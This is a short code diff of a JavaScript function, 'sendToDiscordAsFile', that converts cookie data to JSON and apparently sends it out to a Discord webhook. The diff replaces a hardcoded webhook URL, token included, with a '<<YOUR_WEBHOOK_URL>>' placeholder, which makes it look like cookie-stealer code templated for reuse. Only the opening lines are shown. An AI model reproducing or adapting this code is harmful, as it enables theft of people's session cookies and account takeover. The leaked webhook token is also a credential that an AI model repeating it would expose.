@@ -1,5 +1,5 @@
 async function sendToDiscordAsFile(data) {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1490767746751926462/7FOheUYcmGowIdMEoX-BvYVWQk3wfDj78sFXfpyFYABz6u3Z9MgbrmGKA6hRcfZ6WMqa";  //WEBHOOK URL
+  const WEBHOOK_URL = "<<YOUR_WEBHOOK_URL>>";  //WEBHOOK URL
 
   try {
     // 1. Convert the cookie data to a JSON string
